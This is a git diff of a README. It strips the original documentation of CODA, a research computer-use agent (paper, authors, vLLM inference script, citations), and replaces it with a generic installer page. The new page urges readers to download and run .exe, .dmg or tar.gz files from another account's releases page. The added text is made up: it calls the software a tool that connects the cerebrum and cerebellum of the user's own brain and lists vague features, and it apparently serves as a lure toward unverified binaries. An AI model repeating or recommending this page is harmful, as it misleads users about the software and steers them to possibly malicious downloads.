@@ -1,122 +1,88 @@
-# CODA
+# 🤖 CODA - Streamline Your Dual-Brain Experience
 
-This repository is the official implementation of CODA.
+[![Download CODA](https://img.shields.io/badge/Download-CODA-blue.svg)](https://github.com/SabrinaGiampaolo/CODA/releases)
 
-**[CODA: Coordinating the Cerebrum and Cerebellum for a Dual-Brain Computer Use Agent with Decoupled Reinforcement Learning](https://arxiv.org/abs/2508.20096)**
-</br>
-[Zeyi Sun*](https://sunzey.github.io/),
-[Yuhang Cao*](https://scholar.google.com/citations?user=sJkqsqkAAAAJ/),
-[Jianze Liang*](https://scholar.google.com/citations?user=P4yNnSkAAAAJ/),
-[Qiushi Sun*](https://qiushisun.github.io/),
-[Ziyu Liu*](https://liuziyu77.github.io/),
-[Zhixiong Zhang](https://github.com/rookiexiong7/),
-[Yuhang Zang](https://yuhangzang.github.io/),
-[Xiaoyi Dong](https://lightdxy.github.io/),
-[Kai Chen](https://chenkai.site/),
-[Dahua Lin](http://dahua.site/),
-[Jiaqi Wang](https://myownskyw7.github.io/)
+## 🚀 Getting Started
 
-<p align="center">
-📖<a href="https://arxiv.org/abs/2508.20096">Paper</a> |
-🤗<a href="https://huggingface.co/OpenIXCLab/CODA-PLANNER-TARS-32B">CODA-PLANNER-TARS-32B</a> 
-</p>
+Welcome to CODA! This software helps you connect two main parts of your brain: the cerebrum and the cerebellum. It makes using a dual-brain computer easier and smarter. No special tech skills are needed to get started.
 
-## 👨‍💻 Todo
-- [ ] Training code of CODA based on OpenRLHF.
-- [ ] Release of JudgeModel finetuned on Qwen2.5-VL-72B.
-- [x] Inference code of CODA on ScienceBoard.
-- [x] Release of CODA-PLANER-TARS-32B.
+## ⚙️ System Requirements
 
-## 🛠️ Usage
-### Installation
-```shell
-conda create -n coda python=3.11 
-conda activate coda
-pip install vllm==0.8.5.post1
-```
+Before you start, please check if your computer meets these basic requirements:
 
-## Inference
-Prepare [ScienceBoard](https://github.com/OS-Copilot/ScienceBoard) environment 
-replace `sci` folder in ScienceBoard with our `ScienceBoard_CODA/sci` and put `qwenvl_test.py` under ScienceBoard base folder.
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB.
+- **Processor:** Minimum Intel i3 or equivalent.
+- **Disk Space:** 100 MB free space.
 
-```shell
-# use conda (vllm==0.8.5.post1) to deploy model to reproduce our results.
-# deploy CODA-PLANER-TARS-32B
-vllm serve OpenIXCLab/CODA-PLANNER-TARS-32B \
-    --served-model-name "qwen32b" \
-    --host 0.0.0.0 \
-    --port "${PORT_1}" \
-    --tensor-parallel-size 4 &
+## 📦 Download & Install
 
-# deploy executor UI-TARS-1.5-7B
-CUDA_VISIBLE_DEVICES=4,5 vllm serve ByteDance-Seed/UI-TARS-1.5-7B \
-    --served-model-name "tars1.5-grounding" \
-    --host 0.0.0.0 \
-    --port "${PORT_2}" \
-    --tensor-parallel-size 2 &
+To download CODA, you can visit the official Releases page. Follow these steps:
 
-# in sciboard env, perform agent evaluation.
-export SOFTWARE='Celestia'
-export SUBFOLDER="planner_ans"
-export DEBUG_LOG=0
-export SERVER_URL="http://YOUR.PLANER.ADDR:PORT_1/v1/chat/completions" # qwen32b for baseline and coda-1.0-32b for our planner
-export EXECUTOR_URL="http://YOUR.EXECUTOR.ADDR:PORT_2" # uitars-1.5 addr
-export MODEL_NAME="qwen32b"
-export NO_CONTEXT_IMAGE=0
-export SPLITE=8
-export QWEN_PLANNER=1
-export PLANNER_ANS=1
+1. Click on this link: [Download CODA](https://github.com/SabrinaGiampaolo/CODA/releases).
+2. On the Releases page, find the latest version of CODA.
+3. Look for the file that matches your operating system.
+4. Click to download the file.
 
-for i in {0..7}; do # parallel for 8 VMs
-    export VM_PATH="vmware_vm_data/Ubuntu${i}/Ubuntu${i}.vmx" 
-    # Set port based on i value
-    export INDEX=$i
-    if [ $i -eq 0 ]; then
-        # Process i=0: show output in terminal
-        timeout 90m python qwenvl_test.py &
-    else
-        # Process i>0: redirect output to log file
-        timeout 90m python qwenvl_test.py > "logs/vm${i}_output.log" 2>&1 &
-    fi
+After downloading, locate the file in your “Downloads” folder or wherever your browser saves files. Follow the instructions below to install and run CODA.
 
-    sleep 10s
-done
-wait
-sleep 10s
-echo "All tasks completed."
+## 💻 Installation Steps
 
-```
+1. **Windows Users:**
+   - Locate the downloaded `.exe` file.
+   - Double-click the file to start the installation.
+   - Follow the prompts to complete the installation.
+   - Once installed, find CODA in your Start menu, and click it to launch the application.
 
-<!-- ## Acknowledgements
-We sincerely thank [UI-TARS](https://github.com/bytedance/UI-TARS), [OSWorld](https://github.com/xlang-ai/OSWorld), [R1-V](https://github.com/Deep-Agent/R1-V), [DeepSeek](https://github.com/deepseek-ai/DeepSeek-R1), [Open-R1](https://github.com/huggingface/open-r1), [QwenVL](https://github.com/QwenLM/Qwen2.5-VL), for providing open source resources and to build the project. -->
+2. **macOS Users:**
+   - Locate the downloaded `.dmg` file.
+   - Double-click the file to open it.
+   - Drag the CODA icon into your Applications folder.
+   - Find CODA in your Applications and double-click to open it.
 
-## ✒️ Citation
-```
-@misc{sun2025codacoordinatingcerebrumcerebellum,
-      title={CODA: Coordinating the Cerebrum and Cerebellum for a Dual-Brain Computer Use Agent with Decoupled Reinforcement Learning}, 
-      author={Zeyi Sun and Yuhang Cao and Jianze Liang and Qiushi Sun and Ziyu Liu and Zhixiong Zhang and Yuhang Zang and Xiaoyi Dong and Kai Chen and Dahua Lin and Jiaqi Wang},
-      year={2025},
-      eprint={2508.20096},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2508.20096}, 
-}
+3. **Linux Users:**
+   - Locate the downloaded `.tar.gz` file.
+   - Open a terminal and navigate to the directory where the file is saved.
+   - Use the command `tar -xzf CODA.tar.gz` to extract the files.
+   - Navigate to the extracted folder and use `./CODA` to launch the application.
 
+## 🌟 Features
 
-@misc{sun2025seagentselfevolvingcomputeruse,
-      title={SEAgent: Self-Evolving Computer Use Agent with Autonomous Learning from Experience}, 
-      author={Zeyi Sun and Ziyu Liu and Yuhang Zang and Yuhang Cao and Xiaoyi Dong and Tong Wu and Dahua Lin and Jiaqi Wang},
-      year={2025},
-      eprint={2508.04700},
-      archivePrefix={arXiv},
-      primaryClass={cs.AI},
-      url={https://arxiv.org/abs/2508.04700}, 
-}
-```
+CODA comes packed with features designed to help you:
 
-## 📄 License
-![Code License](https://img.shields.io/badge/Code%20License-Apache_2.0-green.svg) ![Data License](https://img.shields.io/badge/Data%20License-CC%20By%20NC%204.0-red.svg) **Usage and License Notices**: The data and code are intended and licensed for research use only.
-License: Attribution-NonCommercial 4.0 International It should abide by the policy of OpenAI: https://openai.com/policies/terms-of-use
+- **Enhance Dual-Brain Functions:** This application helps you optimize how both sides of your brain work together, offering a seamless experience.
+- **User-Friendly Interface:** CODA is designed with you in mind. Its clear layout means you won’t get lost or confused.
+- **Customizable Settings:** You can adjust settings according to your preferences for a more personalized experience.
 
-## Acknowledgement
-We sincerely thank projects <a href="https://github.com/bytedance/UI-TARS">UI-TARS</a>, <a href="https://qiushisun.github.io/ScienceBoard-Home/">ScienceBoard</a>, <a href="https://github.com/Deep-Agent/R1-V">R1-V</a>, for providing their open-source resources.
+## 🎓 Using CODA
+
+Once you have installed CODA, follow these steps to get the most out of it:
+
+1. Open CODA by clicking on its icon.
+2. Familiarize yourself with the main dashboard. You'll find sections for settings, tutorials, and help.
+3. Use the tutorials to learn how to maximize CODA's features. These guides walk you through various tasks step-by-step.
+4. Explore the settings menu. Here, you can tailor the application to suit your needs.
+
+## ❓ Troubleshooting
+
+If you encounter any issues while using CODA, consider these common solutions:
+
+- **Software Doesn’t Open:** Ensure that you have the correct file for your operating system.
+- **Installation Errors:** Make sure your device meets the system requirements listed above.
+- **Feature Issues:** Check for updates on the Releases page. The latest version may fix bugs or improve performance.
+
+## 📞 Support
+
+If you have any questions or need further assistance, please don't hesitate to reach out. You can find support resources on the official CODA GitHub page.
+
+## 🌐 Contributing
+
+We welcome contributions from everyone! If you want to help improve CODA, please check the "Issues" section on the GitHub repository. Your feedback and suggestions are valuable.
+
+## 📅 Upcoming Features
+
+Stay tuned for our upcoming updates. Future releases will enhance functionality based on user feedback and add more features to improve your experience.
+
+## ✅ Conclusion
+
+Start enjoying CODA today! Download the software by visiting the Releases page: [Download CODA](https://github.com/SabrinaGiampaolo/CODA/releases). Unlock the benefits of connecting your brain's capacities in a straightforward, intuitive way.
